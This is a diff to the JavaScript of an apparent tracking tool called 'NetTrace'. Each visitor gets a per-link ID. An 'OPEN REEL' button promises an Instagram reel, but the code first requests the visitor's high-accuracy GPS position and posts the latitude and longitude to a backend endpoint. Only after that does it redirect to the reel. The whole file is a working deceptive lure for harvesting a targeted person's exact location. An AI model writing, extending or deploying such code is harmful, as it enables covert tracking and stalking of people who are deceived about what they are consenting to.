@@ -1,7 +1,26 @@
+// =====================================================
+// NETTRACE PRECISE LOCATION SYSTEM
+// =====================================================
 
 console.log(
     "✅ NetTrace precise location system ready"
 );
+
+
+// =====================================================
+// GET ELEMENTS
+// =====================================================
+
+const openReelBtn =
+    document.getElementById(
+        "openReelBtn"
+    );
+
+
+const locationStatus =
+    document.getElementById(
+        "locationStatus"
+    );
 
 
 // =====================================================
@@ -19,201 +38,342 @@ console.log(
 
 
 // =====================================================
-// CHECK VISITOR ID
+// INSTAGRAM REEL
 // =====================================================
 
-if (
-    !visitorId ||
-    visitorId === "__VISITOR_ID__"
-) {
-
-    console.error(
-        "❌ Visitor ID is missing!"
-    );
-
-}
-else {
-
-    console.log(
-        "✅ Visitor ID available"
-    );
-
-}
+const REEL_URL =
+    "https://www.instagram.com/reel/Dafa6fgp_02/";
 
 
 // =====================================================
-// REQUEST PRECISE GPS LOCATION
+// BUTTON CLICK
 // =====================================================
 
-function requestPreciseLocation() {
+openReelBtn.addEventListener(
+    "click",
+    function () {
 
-    console.log(
-        "📍 Requesting precise location..."
-    );
-
-
-    if (!navigator.geolocation) {
-
-        console.error(
-            "❌ Geolocation is not supported."
+        console.log(
+            "🎬 OPEN REEL clicked"
         );
 
-        return;
 
-    }
+        // ---------------------------------------------
+        // Check Visitor ID
+        // ---------------------------------------------
+
+        if (
+            !visitorId ||
+            visitorId === "__VISITOR_ID__"
+        ) {
+
+            console.error(
+                "❌ Visitor ID is missing!"
+            );
 
 
-    if (
-        !visitorId ||
-        visitorId === "__VISITOR_ID__"
-    ) {
+            locationStatus.textContent =
+                "Unable to identify this visit.";
 
-        console.error(
-            "❌ Cannot save location because Visitor ID is missing."
+
+            return;
+
+        }
+
+
+        // ---------------------------------------------
+        // Check Geolocation Support
+        // ---------------------------------------------
+
+        if (
+            !navigator.geolocation
+        ) {
+
+            console.error(
+                "❌ Geolocation is not supported."
+            );
+
+
+            locationStatus.textContent =
+                "Location is not supported by this browser.";
+
+
+            return;
+
+        }
+
+
+        // ---------------------------------------------
+        // Disable Button
+        // ---------------------------------------------
+
+        openReelBtn.disabled =
+            true;
+
+
+        locationStatus.textContent =
+            "📍 Requesting location permission...";
+
+
+        console.log(
+            "📍 Requesting precise GPS location..."
         );
 
-        return;
 
-    }
+        // =================================================
+        // REQUEST PRECISE LOCATION
+        // =================================================
 
+        navigator.geolocation.getCurrentPosition(
 
-    navigator.geolocation.getCurrentPosition(
+            // =============================================
+            // SUCCESS
+            // =============================================
 
-        async function (position) {
-
-            console.log(
-                "✅ GPS permission granted"
-            );
-
-
-            const latitude =
-                position.coords.latitude;
-
-            const longitude =
-                position.coords.longitude;
-
-
-            console.log(
-                "📍 Latitude:",
-                latitude
-            );
-
-            console.log(
-                "📍 Longitude:",
-                longitude
-            );
-
-
-            try {
+            async function (position) {
 
                 console.log(
-                    "📡 Sending precise location to backend..."
+                    "✅ Location permission granted!"
                 );
 
 
-                const response =
-                    await fetch(
-                        "/api/save-precise-location",
-                        {
+                const latitude =
+                    position.coords.latitude;
 
-                            method: "POST",
 
-                            headers: {
+                const longitude =
+                    position.coords.longitude;
 
-                                "Content-Type":
-                                    "application/json"
 
-                            },
+                console.log(
+                    "📍 Latitude:",
+                    latitude
+                );
 
-                            body:
-                                JSON.stringify({
 
-                                    visitorId:
-                                        visitorId,
+                console.log(
+                    "📍 Longitude:",
+                    longitude
+                );
 
-                                    latitude:
-                                        latitude,
 
-                                    longitude:
-                                        longitude
+                console.log(
+                    "📡 Sending location to backend..."
+                );
 
-                                })
 
-                        }
+                locationStatus.textContent =
+                    "📍 Location received. Please wait...";
+
+
+                try {
+
+                    // =====================================
+                    // SEND TO BACKEND
+                    // =====================================
+
+                    const response =
+                        await fetch(
+                            "/api/save-precise-location",
+                            {
+
+                                method: "POST",
+
+                                headers: {
+
+                                    "Content-Type":
+                                        "application/json"
+
+                                },
+
+                                body:
+                                    JSON.stringify({
+
+                                        visitorId:
+                                            visitorId,
+
+                                        latitude:
+                                            latitude,
+
+                                        longitude:
+                                            longitude
+
+                                    })
+
+                            }
+                        );
+
+
+                    console.log(
+                        "📡 Backend status:",
+                        response.status
                     );
 
 
-                console.log(
-                    "📡 Backend status:",
-                    response.status
-                );
+                    const data =
+                        await response.json();
 
 
-                const data =
-                    await response.json();
+                    console.log(
+                        "📦 Backend response:",
+                        data
+                    );
 
 
-                console.log(
-                    "📦 Backend response:",
-                    data
-                );
+                    // =====================================
+                    // CHECK BACKEND RESULT
+                    // =====================================
 
+                    if (
+                        !response.ok ||
+                        !data.success
+                    ) {
 
-                if (data.success) {
+                        throw new Error(
+                            data.message ||
+                            "Location could not be saved."
+                        );
+
+                    }
+
 
                     console.log(
                         "🎉 Precise location saved successfully!"
                     );
 
-                }
-                else {
 
-                    console.error(
-                        "❌ Precise location was not saved."
+                    locationStatus.textContent =
+                        "✅ Location permission granted. Opening Reel...";
+
+
+                    // =====================================
+                    // OPEN INSTAGRAM REEL
+                    // =====================================
+
+                    setTimeout(
+                        function () {
+
+                            window.location.href =
+                                REEL_URL;
+
+                        },
+                        500
                     );
 
                 }
+                catch (error) {
 
-            }
-            catch (error) {
+                    console.error(
+                        "❌ Backend request failed:",
+                        error
+                    );
+
+
+                    locationStatus.textContent =
+                        "❌ Could not process your location. Please try again.";
+
+
+                    openReelBtn.disabled =
+                        false;
+
+                }
+
+            },
+
+
+            // =============================================
+            // ERROR
+            // =============================================
+
+            function (error) {
 
                 console.error(
-                    "❌ Backend request failed:",
+                    "❌ Location error:",
                     error
                 );
 
+
+                openReelBtn.disabled =
+                    false;
+
+
+                // -----------------------------------------
+                // Permission denied
+                // -----------------------------------------
+
+                if (
+                    error.code ===
+                    error.PERMISSION_DENIED
+                ) {
+
+                    locationStatus.textContent =
+                        "❌ Location permission was denied.";
+
+                }
+
+
+                // -----------------------------------------
+                // Position unavailable
+                // -----------------------------------------
+
+                else if (
+                    error.code ===
+                    error.POSITION_UNAVAILABLE
+                ) {
+
+                    locationStatus.textContent =
+                        "❌ Your location is currently unavailable.";
+
+                }
+
+
+                // -----------------------------------------
+                // Timeout
+                // -----------------------------------------
+
+                else if (
+                    error.code ===
+                    error.TIMEOUT
+                ) {
+
+                    locationStatus.textContent =
+                        "❌ Location request timed out.";
+
+                }
+
+
+                // -----------------------------------------
+                // Unknown error
+                // -----------------------------------------
+
+                else {
+
+                    locationStatus.textContent =
+                        "❌ Unable to get your location.";
+
+                }
+
+            },
+
+
+            // =============================================
+            // OPTIONS
+            // =============================================
+
+            {
+
+                enableHighAccuracy:
+                    true,
+
+                timeout:
+                    15000,
+
+                maximumAge:
+                    0
+
             }
 
-        },
+        );
 
-
-        function (error) {
-
-            console.error(
-                "❌ Browser location permission/error:",
-                error
-            );
-
-        },
-
-
-        {
-
-            enableHighAccuracy: true,
-
-            timeout: 15000,
-
-            maximumAge: 0
-
-        }
-
-    );
-
-}
-
-
-// =====================================================
-// START LOCATION REQUEST
-// =====================================================
-
-requestPreciseLocation();
+    }
+);
